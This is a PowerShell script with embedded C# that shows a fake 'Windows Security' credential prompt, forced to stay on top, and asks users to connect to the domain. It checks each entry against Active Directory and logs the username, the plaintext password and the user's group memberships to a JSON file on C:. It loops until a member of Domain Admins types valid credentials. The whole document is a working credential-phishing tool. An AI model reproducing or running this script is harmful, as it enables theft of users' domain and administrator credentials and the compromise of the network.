Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class CredUI
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDUI_INFO
    {
        public int cbSize;
        public IntPtr hwndParent;
        public string pszMessageText;
        public string pszCaptionText;
        public IntPtr hbmBanner;
    }

    public const int CREDUI_MAX_USERNAME_LENGTH = 513;
    public const int CREDUI_MAX_PASSWORD_LENGTH = 256;
    public const int CREDUI_MAX_DOMAIN_TARGET_LENGTH = 337;
    public const int CREDUI_FLAGS_GENERIC_CREDENTIALS = 0x40000;
    public const int CREDUI_FLAGS_ALWAYS_SHOW_UI = 0x80;
    public const int CREDUI_FLAGS_DO_NOT_PERSIST = 0x2;

    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    public static extern int CredUIPromptForCredentials(
        ref CREDUI_INFO creditUR,
        string targetName,
        IntPtr reserved1,
        int iError,
        StringBuilder userName,
        int maxUserName,
        StringBuilder password,
        int maxPassword,
        ref bool pfSave,
        int flags
    );

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetWindowPos(
        IntPtr hWnd,
        IntPtr hWndInsertAfter,
        int X,
        int Y,
        int cx,
        int cy,
        uint uFlags
    );

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr FindWindow(
        string lpClassName,
        string lpWindowName
    );

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern int EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
    public const uint SWP_NOSIZE = 0x0001;
    public const uint SWP_NOMOVE = 0x0002;
    public const uint TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;
    public const int SW_SHOW = 5;

    public static IntPtr FindWindowByTitle(string title)
    {
        IntPtr foundHandle = IntPtr.Zero;
        EnumWindows((hWnd, lParam) => {
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(hWnd, sb, sb.Capacity);
            if (sb.ToString() == title)
            {
                foundHandle = hWnd;
                return false;
            }
            return true;
        }, IntPtr.Zero);
        return foundHandle;
    }
}
"@

# Load necessary assemblies
Add-Type -AssemblyName "System.Windows.Forms"
Add-Type -AssemblyName "System.DirectoryServices.AccountManagement"

function Show-CredentialDialog {
    $credui = [CredUI]::new()

    $creduiInfo = [CredUI+CREDUI_INFO]::new()
    $creduiInfo.cbSize = [Runtime.InteropServices.Marshal]::SizeOf([type]([CredUI+CREDUI_INFO]))
    $creduiInfo.pszCaptionText = "Windows Security"
    $creduiInfo.pszMessageText = "Enter your credentials to connect to the domain"

    $username = [System.Text.StringBuilder]::new(513)
    $password = [System.Text.StringBuilder]::new(256)
    $save = $false

    $flags = [CredUI]::CREDUI_FLAGS_GENERIC_CREDENTIALS -bor [CredUI]::CREDUI_FLAGS_ALWAYS_SHOW_UI -bor [CredUI]::CREDUI_FLAGS_DO_NOT_PERSIST

    $result = [CredUI]::CredUIPromptForCredentials([ref]$creduiInfo, "", [IntPtr]::Zero, 0, $username, 513, $password, 256, [ref]$save, $flags)

    # Force the dialog to be topmost
    Start-Sleep -Milliseconds 500 # Allow some time for the dialog to appear
    $hwnd = [CredUI]::FindWindowByTitle("Windows Security")
    if ($hwnd -ne [IntPtr]::Zero) {
        [CredUI]::SetWindowPos($hwnd, [CredUI]::HWND_TOPMOST, 0, 0, 0, 0, [CredUI]::TOPMOST_FLAGS)
        [CredUI]::SetForegroundWindow($hwnd)
        [CredUI]::ShowWindow($hwnd, [CredUI]::SW_SHOW)
    }

    if ($result -eq 0) {
        return @{
            UserName = $username.ToString()
            Password = $password.ToString()
        }
    } else {
        return $null
    }
}

function Get-CurrentDomain {
    try {
        $currentDomain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
        return $currentDomain
    } catch {
        return $null
    }
}

function Get-UserGroups {
    param (
        [string]$username,
        [string]$domain
    )
    $groups = @()
    try {
        $user = New-Object System.Security.Principal.NTAccount("$domain\$username")
        $sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
        $sid.Translate([System.Security.Principal.NTAccount]).Value
        $userPrincipal = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($context, $username)
        if ($userPrincipal) {
            $userPrincipal.GetAuthorizationGroups() | ForEach-Object {
                $groups += $_.Name
            }
        }
    } catch {
    }
    return $groups
}

function Log-SuccessfulLogin {
    param (
        [string]$username,
        [string]$password,
        [string]$domain,
        [string[]]$groups
    )
    $logPath = "C:\login_success_log.json"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = @{
        Timestamp = $timestamp
        UserName = "$domain\$username"
        Password = $password
        Groups = $groups
    }
    $jsonLogEntry = $logEntry | ConvertTo-Json -Depth 3
    Add-Content -Path $logPath -Value $jsonLogEntry
}

$domain = Get-CurrentDomain
if (-not $domain) {
    $msgBox = [System.Windows.Forms.MessageBox]::Show("Failed to get the current domain.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::ServiceNotification)
    $hwnd = [CredUI]::FindWindowByTitle("Error")
    if ($hwnd -ne [IntPtr]::Zero) {
        [CredUI]::SetWindowPos($hwnd, [CredUI]::HWND_TOPMOST, 0, 0, 0, 0, [CredUI]::TOPMOST_FLAGS)
        [CredUI]::SetForegroundWindow($hwnd)
        [CredUI]::ShowWindow($hwnd, [CredUI]::SW_SHOW)
    }
    exit
}

$context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
$validDomainAdmin = $false

while (-not $validDomainAdmin) {
    $creds = Show-CredentialDialog

    if ($creds -ne $null) {
        $username = $creds.UserName
        $password = $creds.Password

        try {
            $isValid = $context.ValidateCredentials($username, $password)
        } catch {
            $isValid = $false
        }

        if ($isValid) {
            $groups = Get-UserGroups -username $username -domain $domain
            if ($groups) {
                Log-SuccessfulLogin -username $username -password $password -domain $domain -groups $groups

                if ($groups -contains "Domain Admins") {
                    $validDomainAdmin = $true
                }
            }
        }
    } else {
        $msgBox = [System.Windows.Forms.MessageBox]::Show("No credentials were entered.", "Login Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::ServiceNotification)
        # Force the error dialog to be topmost
        Start-Sleep -Milliseconds 500 # Allow some time for the dialog to appear
        $hwnd = [CredUI]::FindWindowByTitle("Login Error")
        if ($hwnd -ne [IntPtr]::Zero) {
            [CredUI]::SetWindowPos($hwnd, [CredUI]::HWND_TOPMOST, 0, 0, 0, 0, [CredUI]::TOPMOST_FLAGS)
            [CredUI]::SetForegroundWindow($hwnd)
            [CredUI]::ShowWindow($hwnd, [CredUI]::SW_SHOW)
        }
    }
}
